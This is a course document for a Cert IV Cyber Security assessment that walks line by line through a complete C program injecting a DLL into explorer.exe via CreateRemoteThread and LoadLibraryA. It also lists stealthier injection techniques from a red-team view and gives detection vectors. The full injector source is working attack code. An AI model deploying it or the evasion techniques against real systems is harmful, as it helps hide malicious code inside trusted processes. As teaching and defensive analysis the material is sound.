# DLL Injector — Complete Line-by-Line Documentation

> **Target Audience:** Cert IV Cyber Security  
> **Context:** Educational analysis of classic DLL injection technique for final assessment  
> **Language:** C (Win32 API)  
> **Technique:** Classic Remote Thread Injection (CRT) using `LoadLibraryA`

---

## 1. Overview

This program is a **DLL injector**. Its purpose is to force a legitimate Windows process (`explorer.exe`) to load and execute a malicious Dynamic Link Library (DLL). It does this by:

1. Finding the Process ID (PID) of `explorer.exe`.
2. Opening a handle to that process with full access rights.
3. Allocating memory inside the target process's address space.
4. Writing the path of the DLL into that allocated memory.
5. Creating a remote thread inside `explorer.exe` that calls `LoadLibraryA` and points it at the written DLL path.

Once the thread runs, Windows loads the DLL as if `explorer.exe` itself requested it. From a defender's perspective, the malicious code now executes inside a trusted process, making attribution and detection significantly harder.

---

## 2. Complete Source Code

```c
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <string.h>

DWORD FindProcessId(const char *procname)
{
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnap, &pe)) {
            do {
                if (_stricmp(pe.szExeFile, procname) == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }
    return pid;
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        printf("Usage: Injector.exe <path_to_dll>\n");
        printf("Example: Injector.exe payload.dll\n");
        return 1;
    }

    const char *dllPath = argv[1];
    DWORD pid = FindProcessId("explorer.exe");
    
    if (!pid) {
        printf("[-] explorer.exe not found.\n");
        return 1;
    }
    printf("[+] Found explorer.exe PID: %lu\n", pid);

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        printf("[-] OpenProcess failed. Error: %lu\n", GetLastError());
        return 1;
    }

    SIZE_T pathLen = strlen(dllPath) + 1;
    LPVOID remoteMem = VirtualAllocEx(hProc, NULL, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) {
        printf("[-] VirtualAllocEx failed.\n");
        CloseHandle(hProc);
        return 1;
    }

    if (!WriteProcessMemory(hProc, remoteMem, dllPath, pathLen, NULL)) {
        printf("[-] WriteProcessMemory failed.\n");
        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 1;
    }

    LPTHREAD_START_ROUTINE loadLibAddr = (LPTHREAD_START_ROUTINE)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    
    if (!loadLibAddr) {
        printf("[-] GetProcAddress failed.\n");
        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 1;
    }

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, loadLibAddr, remoteMem, 0, NULL);
    if (!hThread) {
        printf("[-] CreateRemoteThread failed. Error: %lu\n", GetLastError());
        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 1;
    }

    printf("[+] DLL injected successfully into explorer.exe (PID %lu)\n", pid);
    printf("[+] Payload executing inside trusted process.\n");

    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
```

---

## 3. Line-by-Line Breakdown

### 3.1 Header Includes

```c
#include <windows.h>
```
> **Line meaning:** This is the primary header for the Windows API. It declares thousands of functions, types, macros, and constants needed to interact with the Windows operating system: process management, memory management, thread creation, file I/O, etc. Without this, none of the Win32 API calls in this program would compile.

```c
#include <stdio.h>
```
> **Line meaning:** The standard C library input/output header. It declares `printf()`, which the program uses to print status messages to the console. This is part of the C Runtime (CRT) and is cross-platform, but here it is used specifically for user feedback.

```c
#include <tlhelp32.h>
```
> **Line meaning:** Stands for "Tool Help 32-bit". This header declares functions and structures for walking (enumerating) processes, threads, modules, and heaps. It is essential for `CreateToolhelp32Snapshot`, `Process32First`, and `Process32Next`, which are used to find `explorer.exe` in the process list.

```c
#include <string.h>
```
> **Line meaning:** The standard C string manipulation header. It declares `strlen()` and is also needed for `_stricmp()` on some compilers. `strlen()` calculates the length of the DLL path string so the injector knows how many bytes to allocate and write.

---

### 3.2 `FindProcessId` Function

```c
DWORD FindProcessId(const char *procname)
```
> **Line meaning:** This declares a function named `FindProcessId` that takes one parameter: a pointer to a constant character array (`const char *`), which is the name of the process to search for (e.g., `"explorer.exe"`). It returns a `DWORD`, which is a Windows typedef for an unsigned 32-bit integer (`unsigned long`). This return type is used because Windows PIDs are `DWORD` values.

```c
{
```
> **Line meaning:** Opening brace for the function body. In C, all executable statements of a function are enclosed in braces.

```c
    DWORD pid = 0;
```
> **Line meaning:** Declares a local variable `pid` of type `DWORD` and initializes it to `0`. `0` is used as a sentinel value meaning "process not found yet". Local variables in C are stored on the stack and are destroyed when the function returns.

```c
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
```
> **Line meaning:** Calls the Windows API function `CreateToolhelp32Snapshot`. This function takes a "snapshot" of the specified system state at a moment in time.  
> - `TH32CS_SNAPPROCESS` is a flag telling Windows: "snapshot all running processes".  
> - The second argument `0` is ignored when taking a process snapshot.  
> - The return value is a `HANDLE`, which is an opaque reference to the snapshot object. If it fails, it returns `INVALID_HANDLE_VALUE`. The snapshot is essentially a read-only copy of the process list.

```c
    if (hSnap != INVALID_HANDLE_VALUE) {
```
> **Line meaning:** Checks whether the snapshot was created successfully. `INVALID_HANDLE_VALUE` is a special constant (usually `-1` cast to a `HANDLE`) that Windows returns when a handle-creating function fails. If the snapshot is valid, we enter the block to search through it.

```c
        PROCESSENTRY32 pe;
```
> **Line meaning:** Declares a local variable `pe` of type `PROCESSENTRY32`. This is a structure defined in `tlhelp32.h` that holds information about a single process: its name (`szExeFile`), PID (`th32ProcessID`), parent PID, thread count, and more. It acts as a temporary container for each process we inspect.

```c
        pe.dwSize = sizeof(PROCESSENTRY32);
```
> **Line meaning:** Before calling `Process32First`, Windows requires that the `dwSize` member be set to the size of the structure in bytes. This is a common Win32 API pattern called "structure versioning". It allows Microsoft to extend structures in future Windows versions without breaking older code. `sizeof(PROCESSENTRY32)` evaluates to the number of bytes the structure occupies (e.g., 304 bytes on 32-bit systems).

```c
        if (Process32First(hSnap, &pe)) {
```
> **Line meaning:** Calls `Process32First`, which retrieves information about the **first** process in the snapshot and stores it in `pe`. The `&pe` passes the memory address of the `pe` structure so the function can write into it. If the snapshot is empty or an error occurs, it returns `FALSE` (0), and the `if` block is skipped.

```c
            do {
```
> **Line meaning:** Begins a `do...while` loop. This is a post-test loop, meaning the body always executes at least once. We use this because we already have the first process loaded into `pe` from `Process32First`, and we want to check it before moving to the next.

```c
                if (_stricmp(pe.szExeFile, procname) == 0) {
```
> **Line meaning:** Compares the executable filename of the current process (`pe.szExeFile`) with the target name (`procname`). `_stricmp` is a **case-insensitive** string comparison function (the "i" stands for insensitive).  
> - `pe.szExeFile` is a `char[260]` array inside the `PROCESSENTRY32` structure.  
> - If the strings match, the function returns `0`, and the condition is true.  
> - This check is case-insensitive because Windows filenames are case-preserving but not case-sensitive.

```c
                    pid = pe.th32ProcessID;
```
> **Line meaning:** Assigns the Process ID of the matched process to our `pid` variable. `th32ProcessID` is a `DWORD` member of `PROCESSENTRY32` that uniquely identifies the running process across the system.

```c
                    break;
```
> **Line meaning:** Immediately exits the `do...while` loop. There is no need to continue searching the process list once we have found `explorer.exe`.

```c
                }
```
> **Line meaning:** Closes the `if` block for the string comparison.

```c
            } while (Process32Next(hSnap, &pe));
```
> **Line meaning:** Calls `Process32Next` to fetch the **next** process from the snapshot into `pe`. The loop continues as long as `Process32Next` returns `TRUE` (non-zero), meaning there are more processes to enumerate. When it returns `FALSE`, the snapshot has been fully traversed.

```c
        }
```
> **Line meaning:** Closes the `if (Process32First(...))` block.

```c
        CloseHandle(hSnap);
```
> **Line meaning:** Releases the snapshot handle. Every `HANDLE` obtained from Windows should be closed when no longer needed to free kernel resources. Failing to close handles causes a **handle leak**, which wastes memory and can eventually exhaust the process's handle table.

```c
    }
```
> **Line meaning:** Closes the `if (hSnap != INVALID_HANDLE_VALUE)` block.

```c
    return pid;
```
> **Line meaning:** Returns the found PID to the caller. If no match was found, this returns the initial value `0`, which the caller checks as an error condition.

```c
}
```
> **Line meaning:** Closes the `FindProcessId` function body.

---

### 3.3 `main` Function

```c
int main(int argc, char *argv[])
```
> **Line meaning:** This is the program's entry point. Every C program starts execution in `main`.  
> - `int` is the return type; `0` traditionally means success, non-zero means failure.  
> - `argc` (argument count) is the number of command-line arguments passed, including the program name itself.  
> - `argv` (argument vector) is an array of C strings (`char *`), where `argv[0]` is the program name, `argv[1]` is the first argument, etc.

```c
{
```
> **Line meaning:** Opening brace for `main`.

```c
    if (argc < 2) {
```
> **Line meaning:** Checks if fewer than 2 arguments were provided. Since `argv[0]` is always the program name, `argc < 2` means the user did not supply a DLL path. This is input validation.

```c
        printf("Usage: Injector.exe <path_to_dll>\n");
```
> **Line meaning:** Prints a usage message telling the user how to run the program. `\n` is the newline escape sequence.

```c
        printf("Example: Injector.exe payload.dll\n");
```
> **Line meaning:** Prints an example invocation to clarify the expected input.

```c
        return 1;
```
> **Line meaning:** Exits the program with status code `1`, which conventionally indicates an error. The operating system receives this code; batch scripts and other callers can test it.

```c
    }
```
> **Line meaning:** Closes the argument-checking `if` block.

```c
    const char *dllPath = argv[1];
```
> **Line meaning:** Declares a pointer `dllPath` that points to the first user-provided command-line argument. `const` means we promise not to modify the string. This is simply a convenience variable so we don't have to type `argv[1]` repeatedly.

```c
    DWORD pid = FindProcessId("explorer.exe");
```
> **Line meaning:** Calls our custom `FindProcessId` function, passing the string literal `"explorer.exe"`. It searches the running processes and returns the PID. `explorer.exe` is chosen because it is always running on Windows, is a trusted system process, and usually runs with the same user privileges as the logged-in desktop session.

```c
    if (!pid) {
```
> **Line meaning:** Tests whether `pid` is zero. In C, any non-zero value is "truthy" and zero is "falsy". The `!` operator inverts truthiness, so `!pid` is true only when `pid == 0`. This is our error check: if `FindProcessId` returned `0`, the process was not found.

```c
        printf("[-] explorer.exe not found.\n");
```
> **Line meaning:** Prints an error message. The `[-]` prefix is a convention in exploit/pentest tooling to indicate failure.

```c
        return 1;
```
> **Line meaning:** Exits with an error code.

```c
    }
```
> **Line meaning:** Closes the PID check block.

```c
    printf("[+] Found explorer.exe PID: %lu\n", pid);
```
> **Line meaning:** Prints a success message showing the discovered PID. `%lu` is the `printf` format specifier for an unsigned long (`DWORD`). The `[+]` prefix is a convention indicating success.

---

#### Opening the Target Process

```c
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
```
> **Line meaning:** Requests a handle to the target process from the Windows kernel.  
> - `PROCESS_ALL_ACCESS` is a bitmask requesting every possible access right: read, write, execute, create threads, etc. This is aggressive and highly suspicious from a detection standpoint.  
> - `FALSE` means the handle is **not** inheritable by child processes of the injector.  
> - `pid` identifies which process to open.  
> - On success, `hProc` becomes a reference used in subsequent API calls. On failure, it is `NULL` (0).

```c
    if (!hProc) {
```
> **Line meaning:** Checks if `OpenProcess` failed. If `hProc` is `NULL`, the injector cannot proceed.

```c
        printf("[-] OpenProcess failed. Error: %lu\n", GetLastError());
```
> **Line meaning:** Prints the failure message along with the Windows error code. `GetLastError()` retrieves the last error code set by a Win32 API function in the current thread. Common reasons for failure: insufficient privileges, target process protected, or PID no longer valid.

```c
        return 1;
```
> **Line meaning:** Exits on failure.

```c
    }
```
> **Line meaning:** Closes the error check.

---

#### Allocating Memory in the Remote Process

```c
    SIZE_T pathLen = strlen(dllPath) + 1;
```
> **Line meaning:** Calculates the number of bytes needed to store the DLL path string. `strlen` counts characters **excluding** the null terminator (`\0`). We add `1` because C strings must be null-terminated, and `WriteProcessMemory` needs to copy the terminator too so `LoadLibraryA` knows where the string ends. `SIZE_T` is an unsigned integer type sized for the architecture (32-bit on x86, 64-bit on x64).

```c
    LPVOID remoteMem = VirtualAllocEx(hProc, NULL, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```
> **Line meaning:** Allocates memory **inside the address space of another process**. This is a critical step in process injection.  
> - `hProc`: the handle to `explorer.exe`.  
> - `NULL`: lets Windows choose the allocation address automatically.  
> - `pathLen`: how many bytes to allocate.  
> - `MEM_COMMIT | MEM_RESERVE`: two flags OR'd together. `MEM_RESERVE` sets aside a region of virtual address space. `MEM_COMMIT` actually backs it with physical storage (RAM or pagefile).  
> - `PAGE_READWRITE`: the memory protection. The region can be read from and written to. It must be writable so `WriteProcessMemory` can copy the DLL path, and readable so `LoadLibraryA` can read it.  
> - Returns the base address of the allocated block in the **remote** process, cast as `LPVOID` (void pointer).

```c
    if (!remoteMem) {
```
> **Line meaning:** Checks if memory allocation failed.

```c
        printf("[-] VirtualAllocEx failed.\n");
```
> **Line meaning:** Prints the failure message.

```c
        CloseHandle(hProc);
```
> **Line meaning:** Cleans up the process handle before exiting. Good practice to avoid resource leaks even on failure paths.

```c
        return 1;
```
> **Line meaning:** Exits with error.

```c
    }
```
> **Line meaning:** Closes the allocation check.

---

#### Writing the DLL Path into Remote Memory

```c
    if (!WriteProcessMemory(hProc, remoteMem, dllPath, pathLen, NULL)) {
```
> **Line meaning:** Writes data from the injector's own memory into the allocated region inside `explorer.exe`.  
> - `hProc`: target process handle.  
> - `remoteMem`: destination address in `explorer.exe`.  
> - `dllPath`: source address in the injector (points to the string on the injector's stack/heap).  
> - `pathLen`: number of bytes to copy.  
> - `NULL`: we don't care to receive the number of bytes actually written.  
> - Returns `TRUE` on success. The `!` inverts it, so the block executes on failure. This function requires `PROCESS_VM_WRITE` and `PROCESS_VM_OPERATION` rights, which are included in `PROCESS_ALL_ACCESS`.

```c
        printf("[-] WriteProcessMemory failed.\n");
```
> **Line meaning:** Failure message.

```c
        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
```
> **Line meaning:** Frees the memory we previously allocated in `explorer.exe`. `MEM_RELEASE` fully decommits and releases the region. The `0` size is required when using `MEM_RELEASE` for a reserved region. This prevents leaving orphaned memory in the target.

```c
        CloseHandle(hProc);
```
> **Line meaning:** Closes the process handle.

```c
        return 1;
```
> **Line meaning:** Exits with error.

```c
    }
```
> **Line meaning:** Closes the write check.

---

#### Locating `LoadLibraryA`

```c
    LPTHREAD_START_ROUTINE loadLibAddr = (LPTHREAD_START_ROUTINE)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
```
> **Line meaning:** This is the clever core of classic DLL injection. We need the address of `LoadLibraryA` so we can point a remote thread at it.  
> - `GetModuleHandleA("kernel32.dll")`: returns the base address (HMODULE) of `kernel32.dll` **in the injector's own process**. Because Windows maps system DLLs to the **same virtual address** in every process (for a given session), this address is valid in `explorer.exe` too. This is called **DLL address space layout consistency**.  
> - `GetProcAddress(..., "LoadLibraryA")`: looks up the address of the exported function named `LoadLibraryA` inside `kernel32.dll`.  
> - `(LPTHREAD_START_ROUTINE)`: a C type cast. `LPTHREAD_START_ROUTINE` is a typedef for a pointer to a function taking one `LPVOID` argument and returning `DWORD`. `LoadLibraryA`'s signature matches this closely enough (`HMODULE LoadLibraryA(LPCSTR lpLibFileName)`), so the cast is safe on 32-bit. On 64-bit, calling conventions still align for this specific trick.

```c
    if (!loadLibAddr) {
```
> **Line meaning:** Checks if the function lookup failed. This should never happen for `LoadLibraryA` on a healthy Windows system, but robust code checks anyway.

```c
        printf("[-] GetProcAddress failed.\n");
```
> **Line meaning:** Error message.

```c
        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
```
> **Line meaning:** Cleans up allocated memory.

```c
        CloseHandle(hProc);
```
> **Line meaning:** Closes the process handle.

```c
        return 1;
```
> **Line meaning:** Exits with error.

```c
    }
```
> **Line meaning:** Closes the check.

---

#### Creating the Remote Thread

```c
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, loadLibAddr, remoteMem, 0, NULL);
```
> **Line meaning:** Creates a new thread that starts execution inside `explorer.exe`, not inside the injector.  
> - `hProc`: the target process.  
> - `NULL`: default security descriptor (no special security).  
> - `0`: default stack size.  
> - `loadLibAddr`: the starting address of the thread — in this case, the address of `LoadLibraryA`.  
> - `remoteMem`: the argument passed to `LoadLibraryA`. Because `LoadLibraryA` expects a `LPCSTR` (a pointer to a null-terminated string), and `remoteMem` points to the DLL path inside `explorer.exe`'s memory, this causes `explorer.exe` to load that DLL.  
> - `0`: creation flags (0 means run immediately).  
> - `NULL`: we don't need the thread ID returned.  
> This is the actual **injection** moment. The operating system's thread scheduler will eventually dispatch this thread inside `explorer.exe`, and `LoadLibraryA` will execute there.

```c
    if (!hThread) {
```
> **Line meaning:** Checks if thread creation failed.

```c
        printf("[-] CreateRemoteThread failed. Error: %lu\n", GetLastError());
```
> **Line meaning:** Error message with code.

```c
        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
```
> **Line meaning:** Cleans up memory.

```c
        CloseHandle(hProc);
```
> **Line meaning:** Closes process handle.

```c
        return 1;
```
> **Line meaning:** Exits with error.

```c
    }
```
> **Line meaning:** Closes the thread check.

---

#### Success and Cleanup

```c
    printf("[+] DLL injected successfully into explorer.exe (PID %lu)\n", pid);
```
> **Line meaning:** Prints success message with PID.

```c
    printf("[+] Payload executing inside trusted process.\n");
```
> **Line meaning:** Prints a message explaining the red-team advantage: the payload now runs under the identity of a trusted process.

```c
    CloseHandle(hThread);
```
> **Line meaning:** Closes the handle to the remote thread. This does **not** terminate the thread; it just releases our reference to it in the injector process. The thread continues running inside `explorer.exe`.

```c
    CloseHandle(hProc);
```
> **Line meaning:** Closes the handle to `explorer.exe`. Again, the process is unaffected; we simply relinquish our ability to manipulate it from this program.

```c
    return 0;
```
> **Line meaning:** Returns `0`, indicating the injector completed its task successfully.

```c
}
```
> **Line meaning:** Closes the `main` function body and the program.

---

## 4. Key Concepts

### 4.1 Windows API Concepts

| Concept | Explanation |
|---------|-------------|
| **HANDLE** | An opaque reference (usually a pointer or integer) to a kernel object. Processes, threads, files, and memory sections are all kernel objects accessed through handles. |
| **Process ID (PID)** | A unique numeric identifier assigned by Windows to every running process. PIDs are reused after a process terminates, so a PID is only valid while the process lives. |
| **Tool Help API** | A set of functions (`CreateToolhelp32Snapshot`, `Process32First`, `Process32Next`) that enumerate system objects. It is simpler than the native NT API (`NtQuerySystemInformation`) but less stealthy. |
| **VirtualAllocEx / WriteProcessMemory** | These APIs allow one process to manipulate another's address space. They are legitimate debugging and system administration tools, but are also abused for injection. |
| **CreateRemoteThread** | Creates a thread in another process. Legitimate use cases include debuggers injecting breakpoint handlers; malicious use cases include forcing a process to execute arbitrary code. |
| **LoadLibraryA** | A Windows API function that maps a DLL into the calling process's address space and executes its `DllMain`. By calling it remotely, we force a target process to load our DLL. |
| **Kernel32 Base Address Consistency** | Windows maps system DLLs like `kernel32.dll` to the same base virtual address in every process. Therefore, `GetProcAddress` in the injector yields an address valid in the target. |

### 4.2 Process Injection Concepts

| Concept | Explanation |
|---------|-------------|
| **DLL Injection** | A technique where attacker code is packaged as a DLL and forced into a victim process. Once loaded, the DLL runs in the victim's context with the victim's privileges. |
| **Remote Thread Injection** | The specific technique used here: allocate memory in the target, write a DLL path, create a remote thread pointing at `LoadLibraryA`. It is one of the oldest and most documented injection methods. |
| **Process Hollowing / Migration** | Related techniques where the attacker replaces the code of a process or migrates to a new process to evade detection. Remote thread injection is often a precursor. |
| **Trusted Process Abuse** | `explorer.exe` is a trusted, always-running system process. When malicious activity (network connections, file writes) originates from it, defenders are less likely to flag it immediately. |

### 4.3 C Programming Concepts

| Concept | Explanation |
|---------|-------------|
| **Pointers (`char *`, `LPVOID`)** | A pointer stores a memory address. `LPVOID` is a Windows typedef for `void *`, meaning "pointer to anything". Pointers are essential for passing buffers to API functions. |
| **Type Casting** | The `(LPTHREAD_START_ROUTINE)` cast tells the compiler to treat the `LoadLibraryA` address as a thread start function. C allows this because function pointers are just addresses. |
| **`const` qualifier** | `const char *` means the data pointed to cannot be modified through this pointer. It is a safety/contract mechanism. |
| **Null terminator** | C strings end with `\0`. `strlen` does not count it, so we manually add `1` byte when allocating memory. Missing this causes buffer overreads or API failures. |
| **Error handling by return value** | Win32 APIs typically return `NULL`, `0`, or `INVALID_HANDLE_VALUE` on failure. The code checks every return value and cleans up previously acquired resources on failure. |
| **Resource cleanup order** | Memory is freed before handles are closed. Handles are closed in reverse order of acquisition. This prevents dangling references and leaks. |

---

## 5. Why This Technique Works (Red Team Perspective)

1. **Trusted Parent Process:** `explorer.exe` is the Windows shell. Security tools often whitelist its activity because it legitimately accesses files, the registry, and the network.

2. **No Suspicious New Process:** Instead of launching a new `cmd.exe` or `powershell.exe`, the attacker hides inside an existing process. Process-monitoring EDR (Endpoint Detection and Response) sees no new suspicious binary.

3. **Inherited Privileges:** The injected DLL inherits the access token and privileges of `explorer.exe`. If the user is an administrator, the payload has administrative context without UAC elevation.

4. **API Legitimacy:** Every API used (`VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`) is a documented, legitimate Windows debugging/system administration API. Their presence alone is not malicious; context is required for detection.

5. **Address Space Consistency:** The attack relies on `kernel32.dll` being at the same address in every process. This makes the attack portable across Windows versions without needing to hardcode addresses.

---

## 5.5 Real-World Priming

### The Lab Lie

**What the lab lets you believe:** Injecting a DLL into `explorer.exe` with `CreateRemoteThread` + `LoadLibraryA` is stealthy because it runs inside a trusted process.

**What the lab hides from you:** This exact API sequence — `OpenProcess` → `VirtualAllocEx` → `WriteProcessMemory` → `CreateRemoteThread` — is the **signature of classic remote thread injection**. Every EDR on the market flags it. Sysmon logs it as Event ID 8 by default. `CreateRemoteThread` triggers kernel callbacks (`PsSetCreateThreadNotifyRoutine`) that security products register. The injected DLL appears in `explorer.exe`'s module list — visible to `listdlls.exe`, Process Hacker, and EDR PEB walkers.

### How It Dies in Production

| Defense | How It Kills This Technique | Your Lab Bypass |
|---------|---------------------------|-----------------|
| Sysmon Event ID 8 | Logs every `CreateRemoteThread` with source/target process | No Sysmon in lab |
| EDR kernel callbacks | `PsSetCreateThreadNotifyRoutine` allows blocking/logging | No third-party EDR |
| API hooking | EDR hooks `NtCreateThreadEx` and blocks/denies | Defender was stopped |
| Memory scanning | Injected DLL appears in module list; RWX memory flagged | No memory scanner |
| Cross-process handle audit | `OpenProcess` with `PROCESS_ALL_ACCESS` is highly anomalous | No handle auditing |
| Child process anomaly | `explorer.exe` spawning `spoolsv.exe` from `Temp` is instant alert | No parent-child telemetry |

### What a Professional Red Teamer Would Do

**Instead of `CreateRemoteThread` + `LoadLibraryA`, they would use:**
- **APC injection** — `QueueUserAPC` into an alertable thread; no `CreateRemoteThread` event
- **Process hollowing** — `CreateProcess` suspended, unmap legitimate image, write malicious image, resume; the process looks legitimate
- **Mapping injection (section mapping)** — `NtCreateSection` + `NtMapViewOfSection`; no `WriteProcessMemory` event
- **Thread pool injection** — `TpAllocTimer` + `SetThreadpoolTimer`; uses legitimate Windows thread pool APIs

**Key difference:** The pro avoids the four APIs that every EDR watches: `OpenProcess` with `PROCESS_ALL_ACCESS`, `VirtualAllocEx` in remote process, `WriteProcessMemory`, and `CreateRemoteThread`.

### What to Learn Next

| Concept | Why It Matters | Where to Start |
|---------|---------------|----------------|
| APC injection | No `CreateRemoteThread` = no Sysmon Event ID 8 | ired.team: "APC Injection" |
| Process hollowing | Legitimate process name, legitimate parent | MalwareTech: "Process Hollowing" |
| Mapping injection | No `WriteProcessMemory` = no memory write alerts | MDsec: "Mapping Injection" |
| Reflective DLL injection | No disk artifact, no `LoadLibraryA` call | GitHub: `stephenfewer/ReflectiveDLLInjection` |

### The Honest Bottom Line

> This injection technique teaches process memory manipulation, remote thread creation, and DLL loading. It does not teach stealth injection. In the real world, `CreateRemoteThread` + `LoadLibraryA` is the **first injection technique every student learns** and the **first technique every EDR detects**. The value is understanding the primitives. Learn APC injection and process hollowing next.

---

## 6. Detection Vectors

| Vector | Description |
|--------|-------------|
| **OpenProcess with `PROCESS_ALL_ACCESS`** | EDR tools can hook or audit `OpenProcess` calls. A non-debugger process requesting `PROCESS_ALL_ACCESS` to `explorer.exe` is highly anomalous. |
| **VirtualAllocEx + WriteProcessMemory + CreateRemoteThread sequence** | This exact API call sequence is the signature of classic remote thread injection. Behavioral EDR rules flag this chain. |
| **Cross-process thread creation** | `CreateRemoteThread` triggers kernel callbacks. Security products can register callbacks (e.g., `PsSetCreateThreadNotifyRoutine`) to log or block remote thread creation. |
| **New module load in `explorer.exe`** | After injection, the DLL appears in `explorer.exe`'s module list. Tools like Process Hacker, Sysinternals Process Explorer, or `listdlls.exe` will show an unexpected DLL. |
| **Anomalous child processes of `explorer.exe`** | If the payload spawns `spoolsv.exe` or `vncserver.exe` from inside `explorer.exe`, EDR correlation rules may flag `explorer.exe` launching unusual binaries from `C:\Windows\Temp`. |
| **Memory permissions** | Allocating `PAGE_READWRITE` memory in a remote process followed by execution (via thread start) can trigger Data Execution Prevention (DEP) or Control Flow Guard (CFG) events. |
| **Event Tracing for Windows (ETW)** | ETW providers log process, thread, and image load events. SIEM queries can detect `explorer.exe` loading a DLL from a non-standard path (e.g., `Temp` folder). |
| **Sysmon (Event ID 8)** | Sysmon logs `CreateRemoteThread` events with source and target process details. A rule targeting non-system processes creating threads in `explorer.exe` will fire immediately. |

---

> **Educational Note:** This code is provided for academic analysis only. Understanding how injection works is essential for defenders, incident responders, and malware analysts. Deploying this code against systems you do not own or have explicit permission to test is illegal under the *Cybercrime Act 2001* (Cth) and equivalent state legislation.
